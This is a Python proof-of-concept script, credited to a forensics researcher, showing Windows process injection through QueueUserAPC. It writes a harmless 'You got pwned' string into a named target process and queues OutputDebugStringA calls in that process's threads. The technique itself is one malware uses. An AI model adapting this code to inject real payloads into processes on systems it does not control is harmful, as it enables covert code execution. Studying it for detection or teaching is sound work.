#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Copyright 2017, Francesco "dfirfpi" Picasso <francesco.picasso@gmail.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# This code is entirely based on the awesome blog post by Pavel Yosifovich
# "Injecting a DLL without a Remote Thread"
# http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/
#
# Use DebugView or whatever you like to see the messages, since I injected
# OutputDebugString... I started with Beep() but I got tired soon, guess why?
#
"""Python Windows 64 bit test for process injection through APC."""

from __future__ import print_function

import ctypes
import sys
import win32con

BOOL    = ctypes.c_int
DWORD   = ctypes.c_uint32
HANDLE  = ctypes.c_void_p
LONG    = ctypes.c_int32
NULL_T  = ctypes.c_void_p
SIZE_T  = ctypes.c_uint
TCHAR   = ctypes.c_char
USHORT  = ctypes.c_uint16
UCHAR   = ctypes.c_ubyte
ULONG   = ctypes.c_uint32

FALSE = ctypes.c_int(0)
TRUE = ctypes.c_int(1)
NULL = NULL_T(0)
INVALID_HANDLE_VALUE = ctypes.c_int64(-1)

TH32CS_SNAPPROCESS = 0x00000002
TH32CS_SNAPTHREAD = 0x00000004

DLL_KERNEL32 = ctypes.windll.kernel32


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize',              DWORD),
        ('cntUsage',            DWORD),
        ('th32ProcessID',       DWORD),
        ('th32DefaultHeapID',   NULL_T),
        ('th32ModuleID',        DWORD),
        ('cntThreads',          DWORD),
        ('th32ParentProcessID', DWORD),
        ('pcPriClassBase',      LONG),
        ('dwFlags',             DWORD),
        ('szExeFile',           TCHAR * win32con.MAX_PATH)
    ]


class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize',              DWORD),
        ('cntUsage',            DWORD),
        ('th32ThreadID',        DWORD),
        ('th32OwnerProcessID',  DWORD),
        ('tpBasePri',           DWORD),
        ('tpDeltaPri',          DWORD),
        ('dwFlags',             DWORD)
    ]

CloseHandle                 = DLL_KERNEL32.CloseHandle
CreateToolhelp32Snapshot    = DLL_KERNEL32.CreateToolhelp32Snapshot
GetModuleHandle             = DLL_KERNEL32.GetModuleHandleA
GetProcAddress              = DLL_KERNEL32.GetProcAddress
OpenProcess                 = DLL_KERNEL32.OpenProcess
OpenThread                  = DLL_KERNEL32.OpenThread
Process32First              = DLL_KERNEL32.Process32First
Process32Next               = DLL_KERNEL32.Process32Next
QueueUserAPC                = DLL_KERNEL32.QueueUserAPC
Thread32First               = DLL_KERNEL32.Thread32First
Thread32Next                = DLL_KERNEL32.Thread32Next
VirtualAllocEx              = DLL_KERNEL32.VirtualAllocEx
VirtualFreeEx               = DLL_KERNEL32.VirtualFreeEx
WriteProcessMemory          = DLL_KERNEL32.WriteProcessMemory


def process_and_pid(hSnapshot):
    """Utility to retrieve processes and pids."""

    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

    ntBool = Process32First(hSnapshot, ctypes.byref(pe32))
    if ntBool == win32con.TRUE:
        while True:
            yield pe32.szExeFile, pe32.th32ProcessID
            ntBool = Process32Next(hSnapshot, ctypes.byref(pe32))
            if ntBool == win32con.FALSE:
                break


def thread_in_process(hSnapshot, pid):
    """Utility to retrieve threads used by a process."""

    te32 = THREADENTRY32()
    te32.dwSize = ctypes.sizeof(THREADENTRY32)

    ntBool = Thread32First(hSnapshot, ctypes.byref(te32))
    if ntBool == win32con.TRUE:
        while True:
            if te32.th32OwnerProcessID == pid:
                yield te32.th32ThreadID
            ntBool = Thread32Next(hSnapshot, ctypes.byref(te32))
            if ntBool == win32con.FALSE:
                break


def do_the_apc_inject(pid, tids):
    """Inject APCs into the threads of process pid."""

    hProcess = OpenProcess(
        win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_OPERATION, FALSE, pid)

    if hProcess == INVALID_HANDLE_VALUE:
        return -1

    address = VirtualAllocEx(
        hProcess, None, 4096,
        win32con.MEM_COMMIT | win32con.MEM_RESERVE,
        win32con.PAGE_READWRITE)
    if not address:
        CloseHandle(hProcess)
        return -2

    buffer = 'You got pwned pid={0}'.format(pid).encode('ascii')
    ntBool = WriteProcessMemory(hProcess, address, buffer, len(buffer), None)
    if not ntBool:
        CloseHandle(hProcess)
        return -3

    injection_score = 0
    for tid in tids:
        hThread = OpenThread(win32con.THREAD_SET_CONTEXT, FALSE, tid)
        if not hThread:
            continue

        proc_address = DLL_KERNEL32.OutputDebugStringA
        ntResult = QueueUserAPC(proc_address, hThread, address)

        if ntResult:
            injection_score += 1
        CloseHandle(hThread)

    VirtualFreeEx(
        hProcess, address, 0, win32con.MEM_RELEASE | win32con.MEM_DECOMMIT)

    CloseHandle(hProcess)

    return injection_score


def main():
    """Utility core."""

    if len(sys.argv) != 2:
        sys.exit('Missing params [target_process]\n'
			'e.g.: uapc_inject.py explorer.exe')

    target_process = sys.argv[1].lower()

    hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0)
    if hSnapshot == INVALID_HANDLE_VALUE:
        sys.exit('CreateToolhelp32Snapshot returned invalid handle')

    for proc, pid in process_and_pid(hSnapshot):
        if proc.decode('utf-8').lower() == target_process:
            tids = []
            for tid in thread_in_process(hSnapshot, pid):
                tids.append(tid)
            score = do_the_apc_inject(pid, tids)
            if score < 0:
                print('Unable to inject on {} pid {}'.format(proc, pid))
            else:
                print('Injected on {},{},{} threads'.format(proc, pid, score))

    CloseHandle(hSnapshot)


if __name__ == "__main__":
    main()
